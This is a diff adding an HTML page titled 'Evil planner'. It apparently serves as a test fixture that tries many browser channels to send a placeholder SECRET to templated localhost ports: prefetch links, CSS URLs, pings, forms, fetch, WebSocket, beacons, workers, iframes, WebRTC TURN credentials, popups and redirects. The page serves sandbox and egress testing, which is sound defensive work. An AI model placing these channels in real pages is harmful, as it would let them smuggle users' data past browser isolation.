@@ -1,0 +1,26 @@
+<!doctype html><html><head><meta charset=utf-8><title>Evil planner</title>
+<link rel=preconnect href="http://127.0.0.1:PORT_PRECONNECT/">
+<link rel=prefetch href="http://127.0.0.1:PORT_PREFETCH/prefetch?d=SECRET">
+<link rel=prerender href="http://127.0.0.1:PORT_PRERENDER/prerender?d=SECRET">
+<link rel=manifest href="http://127.0.0.1:PORT_MANIFEST/m.json">
+<style>body{background:url(http://127.0.0.1:PORT_CSSURL/css?d=SECRET)}</style>
+</head><body><h1>Planner</h1>
+<a id=pg ping="http://127.0.0.1:PORT_PING/ping?d=SECRET" href="#x">x</a>
+<form id=f action="http://127.0.0.1:PORT_FORM/form" method=GET target=_top><input name=d value=SECRET></form>
+<script>
+function tryit(f){try{f()}catch(e){}}
+tryit(function(){ var pc = new RTCPeerConnection({iceServers:[{urls:"stun:127.0.0.1:UDP_PORT"},{urls:"turn:127.0.0.1:UDP_PORT?transport=udp",username:"SECRET-DATA-IN-TURN",credential:"x"}]});
+  pc.createDataChannel("x"); pc.createOffer().then(function(o){return pc.setLocalDescription(o)}); window._pc=pc; });
+tryit(function(){document.getElementById('pg').click()});
+tryit(function(){fetch("http://127.0.0.1:PORT_FETCH/fetch?d=SECRET",{mode:"no-cors"}).catch(function(){})});
+tryit(function(){ new WebSocket("ws://127.0.0.1:PORT_WS/ws?d=SECRET") });
+tryit(function(){ var i=new Image(); i.src="http://127.0.0.1:PORT_IMG/img?d=SECRET"; });
+tryit(function(){navigator.sendBeacon("http://127.0.0.1:PORT_BEACON/beacon","SECRET")});
+tryit(function(){ new Worker(URL.createObjectURL(new Blob(["fetch('http://127.0.0.1:PORT_WORKER/w?d=SECRET',{mode:'no-cors'}).catch(function(){})"],{type:'text/javascript'}))); });
+tryit(function(){ var f=document.createElement('iframe'); f.src="http://127.0.0.1:PORT_SUBFRAME/sub?d=SECRET"; document.body.appendChild(f); });
+tryit(function(){ var f=document.createElement('iframe'); f.srcdoc="<scr"+"ipt>try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:UDP2_PORT'}]});pc.createDataChannel('y');pc.createOffer().then(function(o){return pc.setLocalDescription(o)});window._k=pc}catch(e){}</scr"+"ipt>"; document.body.appendChild(f); });
+setTimeout(function(){tryit(function(){window.open("http://127.0.0.1:PORT_POPUP/popup?d=SECRET")})},1500);
+setTimeout(function(){tryit(function(){top.location="http://127.0.0.1:PORT_TOPNAV/top?d=SECRET"})},2000);
+setTimeout(function(){tryit(function(){document.getElementById('f').submit()})},2500);
+setTimeout(function(){tryit(function(){location.href="http://127.0.0.1:PORT_SELFNAV/nav?d=SECRET"})},7000);
+</script></body></html>
